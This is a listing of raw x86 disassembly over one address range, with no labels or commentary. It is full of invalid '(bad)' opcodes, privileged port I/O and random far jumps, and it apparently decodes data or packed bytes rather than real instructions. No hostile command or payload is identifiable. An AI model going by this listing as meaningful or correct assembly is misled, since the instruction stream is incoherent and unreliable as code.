  41e7bb:	adc    edx,DWORD PTR [edi-0x572f8f20]
  41e7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7c2:	jo     0x41e7fe
  41e7c4:	inc    eax
  41e7c5:	mov    ecx,0xe0a9cd8b
  41e7ca:	scas   eax,DWORD PTR es:[edi]
  41e7cb:	adc    al,0x8f
  41e7cd:	stos   BYTE PTR es:[edi],al
  41e7ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7cf:	in     al,0x23
  41e7d1:	cld    
  41e7d2:	push   eax
  41e7d3:	mov    ds:0x339bbae5,al
  41e7d8:	in     eax,0xef
  41e7da:	cs (bad) 
  41e7dc:	jns    0x41e808
  41e7de:	mov    ds:0x7cc44116,al
  41e7e3:	mov    DWORD PTR [edx],edx
  41e7e5:	mov    esi,0xadf335ad
  41e7ea:	stos   BYTE PTR es:[edi],al
  41e7eb:	xor    al,0xc
  41e7ed:	sub    eax,DWORD PTR [ebp-0x1da92d95]
  41e7f3:	cwde   
  41e7f4:	xor    bh,BYTE PTR fs:[esi]
  41e7f7:	mov    eax,ds:0x53036785
  41e7fc:	and    dl,BYTE PTR ds:0xc17f8cff
  41e802:	lods   eax,DWORD PTR ds:[esi]
  41e803:	clc    
  41e804:	pop    ebp
  41e805:	add    al,BYTE PTR fs:[edx+0x36]
  41e809:	add    al,0xb1
  41e80b:	or     DWORD PTR cs:[esi-0x1f58be3d],ebp
  41e812:	shl    DWORD PTR [ebx+edi*2-0x4d],1
  41e816:	mov    ebx,0x36fd40d1
  41e81b:	push   esi
  41e81c:	xor    BYTE PTR [eax+0x47],cl
  41e81f:	sbb    eax,0x409ddddc
  41e824:	stos   BYTE PTR es:[edi],al
  41e825:	ins    DWORD PTR es:[edi],dx
  41e826:	rol    BYTE PTR [eax],cl
  41e828:	cmp    eax,0x63a751ca
  41e82d:	xchg   BYTE PTR [ebp+0x20],al
  41e830:	mov    esi,DWORD PTR [ecx]
  41e832:	call   0xf355878a
  41e837:	jno    0x41e7f4
  41e839:	and    al,0xb3
  41e83b:	cld    
  41e83c:	shl    BYTE PTR [ecx+0x2f312fc1],cl
  41e842:	add    BYTE PTR [ecx-0x10e87d89],0xd0
  41e849:	mov    edx,DWORD PTR [si+0x6951]
  41e84e:	jge    0x41e87e
  41e850:	jp     0x41e840
  41e852:	je     0x41e8be
  41e854:	xchg   edi,eax
  41e855:	jmp    0x41e89b
  41e857:	mov    DWORD PTR [eax+0x69da5a96],esi
  41e85d:	addr16 pop eax
  41e85f:	or     eax,0xb49ee115
  41e864:	(bad)  
  41e865:	imul   ebx,DWORD PTR [edx+0x5b4e0c4c],0x2ef34979
  41e86f:	aam    0xd2
  41e871:	out    dx,eax
  41e872:	mov    ds:0x36b07006,eax
  41e877:	xor    al,0x54
  41e879:	in     eax,dx
  41e87a:	and    esi,DWORD PTR [edx]
  41e87c:	cmp    DWORD PTR [ecx+0x3f],ecx
  41e87f:	ins    BYTE PTR es:[edi],dx
  41e880:	pop    esi
  41e881:	and    BYTE PTR [esi+0x2d],0xe3
  41e885:	or     ch,BYTE PTR [edi-0x3]
  41e888:	mov    BYTE PTR [edi+0x11262083],bh
  41e88e:	addr16 push cs
  41e890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e891:	out    dx,eax
  41e892:	rol    BYTE PTR [edx],cl
  41e894:	jl     0x41e878
  41e896:	jae    0x41e8d6
  41e898:	ror    BYTE PTR ds:0x1fc224b9,1
  41e89e:	sbb    ebp,DWORD PTR [ebp+0x399760c4]
  41e8a4:	aam    0x65
  41e8a6:	loop   0x41e863
  41e8a8:	inc    ebp
  41e8a9:	mov    ds:0xb27bbbe9,eax
  41e8ae:	and    DWORD PTR [ebp+0x206d1115],ebp
  41e8b4:	jmp    0xde4e3ba8
  41e8b9:	and    dh,ah
  41e8bb:	js     0x41e8b7
  41e8bd:	stc    
  41e8be:	inc    ebx
  41e8bf:	mov    ?,WORD PTR [ebx-0x79]
  41e8c2:	lods   al,BYTE PTR ds:[esi]
  41e8c3:	ds scas al,BYTE PTR es:[edi]
  41e8c5:	cwde   
  41e8c6:	in     al,0x71
  41e8c8:	(bad)  
  41e8c9:	jmp    0xec42531f
  41e8ce:	sbb    dh,BYTE PTR [edi]
  41e8d0:	fadd   DWORD PTR [esi+eax*8]
  41e8d3:	loope  0x41e935
  41e8d5:	out    0xb8,al
  41e8d7:	xlat   BYTE PTR ds:[ebx]
  41e8d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8d9:	cwde   
  41e8da:	ret    0xd2b5
  41e8dd:	pop    ds
  41e8de:	mov    al,ds:0x66dc54d2
  41e8e3:	jmp    0x1b90fdd7
  41e8e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e9:	mov    edx,0xc919e8e5
  41e8ee:	out    dx,al
  41e8ef:	mov    edi,0x67a8d2cc
  41e8f4:	fdiv   QWORD PTR [esi+0x61]
  41e8f7:	or     BYTE PTR [edi],al
  41e8f9:	add    eax,edx
  41e8fb:	cmp    al,0xbc
  41e8fd:	sub    DWORD PTR [ecx-0x66698a33],edx
  41e903:	retf   
  41e904:	pop    DWORD PTR [ebp+0x2]
  41e907:	cld    
  41e908:	lods   al,BYTE PTR es:[esi]
  41e90a:	push   esi
  41e90b:	std    
  41e90c:	mov    dh,0xf9
  41e90e:	ds push ebp
  41e910:	cmp    edx,DWORD PTR [edx-0x32]
  41e913:	mov    ch,0x1f
  41e915:	or     DWORD PTR [eax+edi*4+0x68],esp
  41e919:	icebp  
  41e91a:	mov    ecx,0xb2d566b3
  41e91f:	and    eax,0x9a56cd35
  41e924:	cmp    BYTE PTR [edi-0x36],dh
  41e927:	nop
  41e928:	pop    eax
  41e929:	push   esi
  41e92a:	add    al,0x3e
  41e92c:	jmp    0x9c30:0xd1df3bea
  41e933:	add    DWORD PTR [ecx],eax
  41e935:	shr    bl,cl
  41e937:	iret   
  41e938:	cmp    eax,0xdd5c4740
  41e93d:	ja     0x41e91c
  41e93f:	(bad)  
  41e940:	dec    esi
  41e941:	inc    eax
  41e942:	add    BYTE PTR [eax],bl
  41e944:	data16 jl 0x41e9b2
  41e947:	inc    ebp
  41e948:	out    dx,al
  41e949:	jns    0x41e8df
  41e94b:	add    BYTE PTR [edx],ah
  41e94d:	pusha  
  41e94e:	stos   BYTE PTR es:[edi],al
  41e94f:	dec    ebx
  41e950:	ss inc eax
  41e952:	jp     0x41e8d5
  41e954:	scas   al,BYTE PTR es:[edi]
  41e955:	xlat   BYTE PTR ds:[ebx]
  41e956:	sub    al,0xac
  41e958:	popf   
  41e959:	gs jnp 0x41e98f
  41e95c:	dec    ebp
  41e95d:	ficom  WORD PTR [ebx-0x21fa2b13]
  41e963:	xchg   ecx,eax
  41e964:	cmp    DWORD PTR [ebx+0x7f],eax
  41e967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e968:	jmp    0x41e9d0
  41e96a:	lods   eax,DWORD PTR ds:[esi]
  41e96b:	xchg   esp,esi
  41e96d:	rcr    BYTE PTR [edi+edx*2+0x64],cl
  41e971:	cmp    BYTE PTR [ebx-0x6b],bh
  41e974:	fisub  WORD PTR ds:0x7f26d4a9
  41e97a:	jecxz  0x41e9ba
  41e97c:	ret    0x62e4
  41e97f:	cmp    eax,0x29716ac8
  41e984:	bound  edi,QWORD PTR [ebp+0x5d36b5a9]
  41e98a:	mov    ah,0xdf
  41e98c:	pusha  
  41e98d:	test   al,0xab
  41e98f:	xchg   ebp,eax
  41e990:	pop    es
  41e991:	cdq    
  41e992:	sub    edx,DWORD PTR [edx-0x2bc5c256]
  41e998:	add    DWORD PTR [edi],0x6a
  41e99b:	mov    bh,0x16
  41e99d:	mov    dl,0x8f
  41e99f:	jne    0x41e948
  41e9a1:	cdq    
  41e9a2:	pop    edi
  41e9a3:	mov    bh,0xe2
  41e9a5:	nop
  41e9a6:	retf   
  41e9a7:	xchg   ebp,eax
  41e9a8:	sti    
  41e9a9:	mov    esi,0xf7ba1ff7
  41e9ae:	push   ss
  41e9af:	cld    
  41e9b0:	adc    ebx,DWORD PTR [ebx-0x3b]
  41e9b3:	(bad)  
  41e9b5:	cdq    
  41e9b6:	popa   
  41e9b7:	(bad)  [ecx]
  41e9b9:	sti    
  41e9ba:	ins    BYTE PTR es:[edi],dx
  41e9bb:	lock pop ds
  41e9bd:	push   0xffffffca
  41e9bf:	cs stc 
  41e9c1:	jmp    0xb3ab:0x61741470
  41e9c8:	ds retf 
  41e9ca:	sbb    edx,esp
  41e9cc:	sbb    ah,BYTE PTR [ecx]
  41e9ce:	stos   DWORD PTR es:[edi],eax
  41e9cf:	in     al,0x58
  41e9d1:	adc    eax,0x236c3844
  41e9d6:	cmp    DWORD PTR [edi-0x10],eax
  41e9d9:	dec    ebx
  41e9da:	out    0x13,eax
  41e9dc:	xchg   ebp,eax
  41e9dd:	dec    esi
  41e9de:	adc    BYTE PTR [esp+ecx*1+0x17ffb842],ch
  41e9e5:	xor    eax,0x537883c7
  41e9ea:	push   0xc31e0632
  41e9ef:	std    
  41e9f0:	aam    0xe3
  41e9f2:	test   DWORD PTR [eax],ebx
  41e9f4:	pop    ss
  41e9f5:	jp     0x41e9c9
  41e9f7:	xchg   edx,eax
  41e9f8:	cld    
  41e9f9:	mov    eax,0x801f97d
  41e9fe:	shl    BYTE PTR [edx+0x4f],0xa8
  41ea02:	inc    edx
  41ea03:	push   ds
  41ea04:	test   DWORD PTR [eax],0x64aa37f6
  41ea0a:	(bad)  
  41ea0b:	xchg   ecx,eax
  41ea0c:	inc    edx
  41ea0d:	jne    0x41ea0f
  41ea0f:	(bad)  
  41ea10:	fs cld 
  41ea12:	mov    dh,0x8f
  41ea14:	xchg   BYTE PTR [edi+0x73],ch
  41ea17:	add    BYTE PTR [edi+0x6],bl
  41ea1a:	push   ebp
  41ea1b:	nop
  41ea1c:	or     eax,0xda8b65af
  41ea21:	cdq    
  41ea22:	inc    esi
  41ea23:	xchg   esi,eax
  41ea25:	int3   
  41ea26:	sub    eax,0xf3ba5ac0
  41ea2b:	(bad)  [ebx+esi*2-0x4470ada3]
  41ea32:	daa    
  41ea33:	cli    
  41ea34:	lods   eax,DWORD PTR ds:[esi]
  41ea35:	cmp    esi,esi
  41ea37:	mov    ecx,0x6791b926
  41ea3c:	neg    bl
  41ea3e:	rcr    DWORD PTR [ebx],cl
  41ea40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea41:	jno    0x41ea86
  41ea43:	mov    WORD PTR ds:0x4f98115a,es
  41ea49:	ins    DWORD PTR es:[edi],dx
  41ea4a:	push   edx
  41ea4b:	sub    ebp,ebx
  41ea4d:	or     eax,0x1cae1fa7
  41ea52:	daa    
  41ea53:	add    BYTE PTR [edi+0x77],0x55
  41ea57:	mov    al,0xa5
  41ea59:	cwde   
  41ea5a:	dec    edi
  41ea5b:	xchg   BYTE PTR [edi],bl
  41ea5d:	in     al,dx
  41ea5e:	pop    eax
  41ea5f:	rcl    BYTE PTR [edi],0x5b
  41ea62:	push   0x62
  41ea64:	add    BYTE PTR [esi-0x47],cl
  41ea67:	push   0xd8395915
  41ea6c:	pop    ss
  41ea6d:	cmp    al,0xf2
  41ea6f:	jmp    0x5ba7:0x26a15239
  41ea76:	in     al,0x32
  41ea78:	xchg   ebp,eax
  41ea79:	push   ss
  41ea7a:	in     eax,0xc2
  41ea7c:	mov    al,ds:0x6a373703
  41ea81:	mov    esp,0x28f75aad
  41ea86:	iret   
  41ea87:	push   ecx
  41ea88:	mov    ah,0xfa
  41ea8a:	ins    DWORD PTR es:[edi],dx
  41ea8b:	sub    DWORD PTR [edx-0x28efe1a8],esp
  41ea91:	jmp    0x41eaf2
  41ea93:	enter  0x5d44,0xcf
  41ea97:	stos   DWORD PTR es:[edi],eax
  41ea98:	cmp    eax,0xfdc6a54f
  41ea9d:	push   cs
  41ea9e:	lods   eax,DWORD PTR ds:[esi]
  41ea9f:	mov    edi,0x4aca8656
  41eaa4:	push   edx
  41eaa5:	rol    bl,1
  41eaa7:	hlt    
  41eaa8:	jp     0x41eaea
  41eaaa:	mov    ds:0xd865f030,eax
  41eaaf:	jp     0x41eac3
  41eab1:	and    al,bh
  41eab3:	push   ecx
  41eab4:	sbb    DWORD PTR [eax+eax*4-0x4bf74737],ecx
  41eabb:	push   esi
  41eabc:	scas   al,BYTE PTR es:[edi]
  41eabd:	popf   
  41eabe:	and    ebp,DWORD PTR [edx-0x3ea712e3]
  41eac4:	add    al,0x27
  41eac6:	ret    
  41eac7:	jp     0x41ead5
  41eac9:	xchg   BYTE PTR [eax],bh
  41eacb:	ins    DWORD PTR es:[edi],dx
  41eacc:	inc    esp
  41eacd:	dec    ebx
  41eace:	sbb    eax,0x6000d0e7
  41ead3:	daa    
  41ead4:	stos   DWORD PTR es:[edi],eax
  41ead5:	xchg   esp,eax
  41ead6:	push   ss
  41ead7:	xor    dh,ch
  41ead9:	ret    0xd9c9
  41eadc:	push   edi
  41eadd:	sub    eax,0x7ea94798
  41eae2:	sahf   
  41eae3:	xor    DWORD PTR [ecx],ebx
  41eae5:	cwde   
  41eae6:	gs or  ah,cl
  41eae9:	call   0x9bb7:0x99277978
  41eaf0:	mov    edi,0x37b00b18
  41eaf5:	push   esi
  41eaf6:	pushf  
  41eaf7:	in     eax,dx
  41eaf8:	dec    ebp
  41eaf9:	ror    DWORD PTR [edi+0x5123a66a],cl
  41eaff:	pop    ebx
  41eb00:	push   0xffffffd8
  41eb02:	cdq    
  41eb03:	call   0x7ef2fab6
  41eb08:	fidivr WORD PTR [ebp-0x3d164f78]
  41eb0e:	pop    ds
  41eb0f:	stc    
  41eb10:	mov    eax,0x27e8c6f7
  41eb15:	push   esi
  41eb16:	or     BYTE PTR ds:0xea215b3a,dh
  41eb1c:	fcomp  DWORD PTR [ebx-0xd]
  41eb1f:	fnstsw WORD PTR [ebp+0x4ac9487f]
  41eb25:	mov    bh,0x73
  41eb27:	rol    DWORD PTR ds:0x8289bd28,0x8b
  41eb2e:	push   edi
  41eb2f:	xchg   ecx,eax
  41eb30:	mov    bh,0x8d
  41eb32:	mov    cl,0x97
  41eb34:	mov    ds:0xe36f186e,al
  41eb39:	ja     0x41eaf7
  41eb3b:	rol    BYTE PTR [edi+0x76],1
  41eb3e:	(bad)  
  41eb3f:	(bad)  
  41eb41:	adc    al,0xe7
  41eb43:	enter  0x27fb,0x8c
  41eb47:	shl    DWORD PTR [esi+0x4a454c96],0xb8
  41eb4e:	cwde   
  41eb4f:	xchg   edx,eax
  41eb50:	idiv   esi
  41eb52:	push   es
  41eb53:	test   eax,0x95d7c14a
  41eb58:	test   eax,0x8b9d7201
  41eb5d:	sti    
  41eb5e:	lea    ebp,[edi+0x72]
  41eb61:	stos   DWORD PTR es:[edi],eax
  41eb62:	js     0x41ebdd
  41eb64:	xor    BYTE PTR [ebx+edx*4],ch
  41eb67:	jae    0x41eb30
  41eb69:	(bad)  
  41eb6a:	call   0x7e2fd996
  41eb6f:	outs   dx,BYTE PTR ds:[esi]
  41eb70:	jb     0x41eb52
  41eb72:	mov    ebp,eax
  41eb74:	xchg   ebp,eax
  41eb75:	pop    edx
  41eb76:	inc    edx
  41eb77:	jmp    0x6ce7:0x2a12faa9
  41eb7e:	imul   esp,DWORD PTR [eax+0x2ef05557],0xce8be6ef
  41eb88:	ja     0x41ebbc
  41eb8a:	adc    DWORD PTR [edx+0x16],ebx
  41eb8d:	and    esi,DWORD PTR [eax+0x5a]
  41eb90:	ror    BYTE PTR [ebp+0x6ef20156],0x1d
  41eb97:	sub    al,0x4b
  41eb99:	inc    esp
  41eb9a:	xchg   esi,eax
  41eb9b:	xchg   BYTE PTR [edi+0x22e7a6bd],al
  41eba1:	push   0x75b7e1a6
  41eba6:	loopne 0x41ec09
  41eba8:	pushf  
  41eba9:	jmp    0xe88cf27e
  41ebae:	pop    edx
  41ebaf:	mov    DWORD PTR [eax-0x1b9d5ab5],0xd9355573
  41ebb9:	mov    ds:0x7395bc98,al
  41ebbe:	jo     0x41eb96
  41ebc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc1:	mov    edx,0x388d0ba4
  41ebc6:	cli    
  41ebc7:	and    eax,0xc16519a0
  41ebcc:	repz cs push ecx
  41ebcf:	sti    
  41ebd0:	shr    BYTE PTR [eax-0x5a],1
  41ebd3:	(bad)  
  41ebd4:	fst    QWORD PTR [eax-0x2a1d4506]
  41ebda:	hlt    
  41ebdb:	cmp    DWORD PTR [ecx-0x48],esp
  41ebde:	in     al,0x8f
  41ebe0:	clc    
  41ebe1:	jnp    0x41ebee
  41ebe3:	add    eax,0x987707ce
  41ebe8:	add    BYTE PTR [edx-0x64],dl
  41ebeb:	test   BYTE PTR [eax+ebx*4+0x4e8b7f46],dh
  41ebf2:	int    0xe5
  41ebf4:	push   cs
  41ebf5:	mov    bl,0xba
  41ebf7:	popa   
  41ebf8:	pushf  
  41ebf9:	mov    ah,0x59
  41ebfb:	jle    0x41eb97
  41ebfd:	mov    ah,0x9b
  41ebff:	jp     0x41ec79
  41ec01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec02:	adc    esi,DWORD PTR ds:0x7f4f9541
  41ec08:	cmp    edx,DWORD PTR [ecx+0x2b15329b]
  41ec0e:	sbb    edi,DWORD PTR ss:[edi]
  41ec11:	xchg   esi,eax
  41ec12:	sbb    ebx,edx
  41ec14:	xchg   esi,eax
  41ec15:	out    0x9c,al
  41ec17:	ror    BYTE PTR [ebx-0x661b364],0xbd
  41ec1e:	mov    BYTE PTR [edi+0x4add3509],dl
  41ec24:	not    al
  41ec26:	cmp    dl,BYTE PTR [ecx]
  41ec28:	xchg   edi,eax
  41ec29:	sub    DWORD PTR ds:[edx],esi
  41ec2c:	push   ds
  41ec2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec2e:	pop    esi
  41ec2f:	scas   eax,DWORD PTR es:[edi]
  41ec30:	and    al,0xa9
  41ec32:	pop    esi
  41ec33:	cmc    
  41ec34:	and    DWORD PTR [ecx+0x7a7b62cb],edx
  41ec3a:	lahf   
  41ec3b:	pop    es
  41ec3c:	(bad)
  41ec3f:	dec    ebx
  41ec40:	or     eax,0xec3d2d7d
  41ec45:	hlt    
  41ec46:	addr16 jmp 0xf9a4d7ad
  41ec4c:	clc    
  41ec4d:	jmp    0x41ecaa
  41ec4f:	loope  0x41ecb0
  41ec51:	sub    DWORD PTR [ecx],ebp
  41ec53:	push   es
  41ec54:	push   esi
  41ec55:	jle    0x41ec7c
  41ec57:	fwait
  41ec58:	cmp    BYTE PTR ds:0xd2cfb378,ch
  41ec5e:	adc    esi,DWORD PTR [ebp+0x69]
  41ec61:	pop    edi
  41ec62:	pop    es
  41ec63:	je     0x41ec1d
  41ec65:	sub    BYTE PTR fs:[ebp+0x5],bh
  41ec69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6a:	sbb    al,0xe1
  41ec6c:	shr    BYTE PTR ds:0x8023fba0,1
  41ec72:	pop    ebp
  41ec73:	and    bh,BYTE PTR [eax]
  41ec75:	test   ch,cl
  41ec77:	shl    dh,1
  41ec79:	pushf  
  41ec7a:	sti    
  41ec7b:	call   0x3e19fdd
  41ec80:	push   ebx
  41ec81:	call   0x72c8:0x7e461328
  41ec88:	pop    esp
  41ec89:	add    DWORD PTR [esi+0x2696e45f],eax
  41ec8f:	add    al,0xbb
  41ec91:	cmp    al,0xdb
  41ec93:	adc    BYTE PTR [eax-0x183724f9],dh
  41ec99:	or     al,0x53
  41ec9b:	xchg   DWORD PTR [edi-0x4ec76e62],edi
  41eca1:	lods   eax,DWORD PTR ds:[esi]
  41eca2:	nop
  41eca3:	dec    ebp
  41eca4:	pop    ds
  41eca5:	xor    eax,0x8eef6821
  41ecaa:	inc    edi
  41ecab:	cmp    DWORD PTR [edi+eiz*8+0x25],edx
  41ecaf:	scas   eax,DWORD PTR es:[edi]
  41ecb0:	scas   eax,DWORD PTR es:[edi]
  41ecb1:	sub    BYTE PTR [edi+0x1c115f92],cl
  41ecb7:	mov    ah,bh
  41ecb9:	daa    
  41ecba:	mov    dl,0xf
  41ecbd:	add    DWORD PTR [edi],edi
  41ecbf:	test   BYTE PTR [ebp-0x3c],0x7a
  41ecc3:	jb     0x41ed0d
  41ecc5:	fsubr  QWORD PTR [ecx+0x64]
  41ecc8:	jno    0x41ed2b
  41ecca:	repnz in ax,0x74
  41ecce:	hlt    
  41eccf:	lds    ebp,FWORD PTR [edx+0x6cab6170]
  41ecd5:	popf   
  41ecd6:	out    dx,al
  41ecd7:	fild   WORD PTR [esi]
  41ecd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecda:	jp     0x41ed4d
  41ecdc:	gs call 0x8e7e2d02
  41ece2:	jecxz  0x41ed5c
  41ece4:	jmp    0x41ed4a
  41ece6:	in     eax,0xe0
  41ece8:	or     BYTE PTR [edx+0x7d332bb6],ch
  41ecee:	iret   
  41ecef:	jmp    0x41ed6c
  41ecf1:	not    ebx
  41ecf3:	mov    eax,ds:0xf217d189
  41ecf8:	retf   0x3782
  41ecfb:	aaa    
  41ecfc:	cwde   
  41ecfd:	jecxz  0x41ed1c
  41ecff:	sub    edx,DWORD PTR [ebp-0x549147bd]
  41ed05:	add    ah,al
  41ed07:	fisttp DWORD PTR [esi+ecx*1]
  41ed0a:	or     DWORD PTR [ebp-0x58],eax
  41ed0d:	ss add eax,0x1431e581
  41ed13:	imul   ebx,DWORD PTR [edi+0x0],0x69
  41ed17:	add    BYTE PTR [ecx+0x41b72c5b],al
  41ed1d:	in     al,dx
  41ed1e:	xchg   ebp,eax
  41ed1f:	iret   
  41ed20:	jne    0x41ecce
  41ed22:	repz and BYTE PTR [eax],0xb6
  41ed26:	add    al,0x69
  41ed28:	enter  0xf119,0x40
  41ed2c:	lods   al,BYTE PTR ds:[esi]
  41ed2d:	int3   
  41ed2e:	push   ss
  41ed2f:	sbb    DWORD PTR [ebx],edx
  41ed31:	push   edx
  41ed32:	and    al,0x4c
  41ed34:	dec    ebx
  41ed35:	sbb    bl,BYTE PTR [eax]
  41ed37:	sbb    BYTE PTR [ebp+0x17050b0e],0xcf
  41ed3e:	mov    ds:0xf5db20e6,al
  41ed43:	adc    bl,BYTE PTR [eax]
  41ed45:	fmul   DWORD PTR [edi+0x37493f55]
  41ed4b:	adc    DWORD PTR [bx+si],edx
  41ed4e:	mov    bl,0xb3
  41ed50:	sbb    al,0x41
  41ed52:	dec    edi
  41ed53:	rcr    BYTE PTR [edi+0xd884866],0xe8
  41ed5a:	int3   
  41ed5b:	inc    ebx
  41ed5c:	cmp    DWORD PTR ds:[ebx+eiz*2],ebp
  41ed60:	es sti 
  41ed62:	(bad)  
  41ed63:	fcmovnu st,st(2)
  41ed65:	xchg   edx,eax
  41ed66:	imul   ebx,DWORD PTR [eax-0x5f],0x35f5e643
  41ed6d:	in     eax,0xbb
  41ed6f:	pop    edi
  41ed70:	imul   ebx,DWORD PTR [edi-0x7f],0x4bc0c446
  41ed77:	dec    ecx
  41ed78:	pop    esp
  41ed79:	(bad)
  41ed7c:	push   edx
  41ed7d:	lea    eax,[edx+0x24]
  41ed80:	inc    esi
  41ed81:	das    
  41ed82:	aad    0xf9
  41ed84:	pop    esp
  41ed85:	into   
  41ed86:	jb     0x41ed92
  41ed88:	sbb    ch,BYTE PTR [edx-0x3847f2d0]
  41ed8e:	call   0x51e2e92e
  41ed93:	add    al,0xb2
  41ed95:	cmp    eax,0xf7ae2bba
  41ed9a:	add    ah,ah
  41ed9c:	retf   0xab3f
  41ed9f:	or     eax,DWORD PTR [esp+ecx*4+0x74]
  41eda3:	push   esi
  41eda4:	(bad)  
  41eda5:	bound  eax,QWORD PTR [ebx]
  41eda7:	add    al,0x91
  41eda9:	out    dx,al
  41edaa:	jp     0x41ed8c
  41edac:	inc    ecx
  41edad:	push   ds
  41edae:	pop    ecx
  41edaf:	xchg   ebp,eax
  41edb0:	pop    esp
  41edb1:	outs   dx,DWORD PTR ds:[esi]
  41edb2:	ins    DWORD PTR es:[edi],dx
  41edb3:	add    DWORD PTR [ecx],esi
  41edb5:	cdq    
  41edb6:	(bad)  
  41edb7:	out    0x32,eax
  41edb9:	dec    edx
  41edba:	imul   esp,DWORD PTR [ecx],0x5b3ce577
  41edc0:	sbb    ecx,DWORD PTR [ecx]
  41edc2:	leave  
  41edc3:	inc    esi
  41edc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc5:	pop    esi
  41edc6:	pop    ecx
  41edc7:	pushf  
  41edc8:	xor    eax,0x4f63ebe8
  41edcd:	dec    eax
  41edce:	adc    al,0x96
  41edd0:	sbb    al,0x5b
  41edd2:	icebp  
  41edd3:	test   edi,ecx
  41edd5:	adc    eax,esi
  41edd7:	mov    eax,ds:0x6e41040
  41eddc:	pop    esp
  41eddd:	push   ds
  41edde:	xchg   esi,eax
  41eddf:	stc    
  41ede0:	(bad)  
  41ede1:	int    0x3c
  41ede3:	cli    
  41ede4:	jmp    0x8b88:0x41d253a0
  41edeb:	jmp    0xcc3d:0x97831f3f
  41edf2:	or     al,0xa7
  41edf4:	(bad)  
  41edf5:	imul   eax,DWORD PTR [ebp-0x4b],0x7d
  41edf9:	mov    al,0xe9
  41edfb:	pusha  
  41edfc:	mov    al,ds:0x307935
  41ee01:	mov    bl,0xb4
  41ee03:	and    ebx,ebp
  41ee05:	stos   DWORD PTR es:[edi],eax
  41ee06:	xlat   BYTE PTR ds:[ebx]
  41ee07:	or     DWORD PTR [edx+0x29],esi
  41ee0a:	in     al,0x1f
  41ee0c:	sub    edx,0xffffffa6
  41ee0f:	dec    esp
  41ee10:	push   es
  41ee11:	mov    ch,0x55
  41ee13:	lahf   
  41ee14:	inc    esp
  41ee15:	adc    BYTE PTR ds:0x5e6c2a10,cl
  41ee1b:	leave  
  41ee1c:	xor    BYTE PTR [ebp-0x79],dl
  41ee1f:	inc    edi
  41ee20:	push   ecx
  41ee21:	fistp  QWORD PTR [ebp-0x23]
  41ee24:	fs (bad) 
  41ee26:	hlt    
  41ee27:	jle    0x41ee1a
  41ee29:	cwde   
  41ee2a:	sbb    ah,BYTE PTR [eax]
  41ee2c:	add    al,0xc8
  41ee2e:	inc    edx
  41ee2f:	push   esp
  41ee30:	jecxz  0x41ee1b
  41ee32:	mov    eax,ds:0x8508919d
  41ee37:	or     edx,DWORD PTR [edi]
  41ee39:	out    dx,eax
  41ee3a:	ret    
  41ee3b:	jmp    0x956fd9d5
  41ee40:	push   eax
  41ee41:	neg    BYTE PTR [ebp+0x38]
  41ee44:	inc    ebx
  41ee45:	in     eax,dx
  41ee46:	popf   
  41ee47:	arpl   WORD PTR [ecx],sp
  41ee49:	push   esp
  41ee4a:	cdq    
  41ee4b:	and    bh,dh
  41ee4d:	add    ebp,DWORD PTR [ebx]
  41ee4f:	jno    0x41ee7d
  41ee51:	adc    dh,ah
  41ee53:	data16 fmul DWORD PTR [ebp-0x1e0f468]
  41ee5a:	mov    esi,0x9b9c01e6
  41ee5f:	lea    ebp,[eax-0x7759c333]
  41ee65:	in     eax,0xa2
  41ee67:	div    DWORD PTR [eax+0x45f8c242]
  41ee6d:	pushf  
  41ee6e:	call   0xd35ba2d
  41ee73:	add    eax,0xc958fd11
  41ee78:	rcr    eax,0x51
  41ee7b:	inc    eax
  41ee7c:	sbb    eax,0x258454f5
  41ee81:	add    ebx,DWORD PTR [eax+eiz*8-0x2b]
  41ee85:	mov    dh,0x28
  41ee87:	mov    edx,0x33a93d13
  41ee8c:	dec    ebx
  41ee8d:	jp     0x41eec9
  41ee8f:	aad    0x5f
  41ee91:	outs   dx,BYTE PTR ds:[esi]
  41ee92:	daa    
  41ee93:	ret    0x9454
  41ee96:	es pop esp
  41ee98:	jl     0x41eecf
  41ee9a:	push   0xd02e6dc4
  41ee9f:	dec    ebx
  41eea0:	jns    0x41eedd
  41eea2:	bound  ebx,QWORD PTR [ecx+ebx*8-0x56]
  41eea6:	in     eax,0xda
  41eea8:	repnz outs dx,DWORD PTR ds:[esi]
  41eeaa:	pop    ss
  41eeab:	addr16 sbb eax,0x6f905383
  41eeb1:	ins    BYTE PTR es:[edi],dx
  41eeb2:	pop    ss
  41eeb3:	sub    BYTE PTR [edi*8+0x166455eb],dl
  41eeba:	jo     0x41ee7f
  41eebc:	test   DWORD PTR [eax],eax
  41eebe:	xor    al,0x72
  41eec0:	inc    esi
  41eec1:	pusha  
  41eec2:	imul   ebp,DWORD PTR [ecx],0xffffff91
  41eec5:	mov    esp,0x81a3f62c
  41eeca:	or     ah,BYTE PTR [edx-0x7ae0c78d]
  41eed0:	push   es
  41eed1:	pusha  
  41eed2:	jecxz  0x41eec4
  41eed4:	jg     0x41ef08
  41eed6:	ins    DWORD PTR es:[edi],dx
  41eed7:	fstp   DWORD PTR [ecx-0x1fc7fabe]
  41eedd:	xor    al,0xc7
  41eedf:	dec    esi
  41eee0:	xchg   ebx,eax
  41eee1:	and    ch,BYTE PTR [eax+0x76]
  41eee4:	popa   
  41eee5:	xchg   DWORD PTR [ecx],eax
  41eee7:	fmul   st,st(5)
  41eee9:	fisttp QWORD PTR gs:[ebx+0x727649b8]
  41eef0:	test   DWORD PTR [esi],edi
  41eef2:	and    BYTE PTR [edi+0x2],dl
  41eef5:	sub    eax,0xc4e82cc9
  41eefa:	mov    dh,0x46
  41eefc:	push   0xffffffb6
  41eefe:	or     al,0x1c
  41ef00:	xor    al,BYTE PTR [edx+0x74669cf3]
  41ef06:	ror    DWORD PTR [ebx+0x32],0xa7
  41ef0a:	call   0xdfade58d
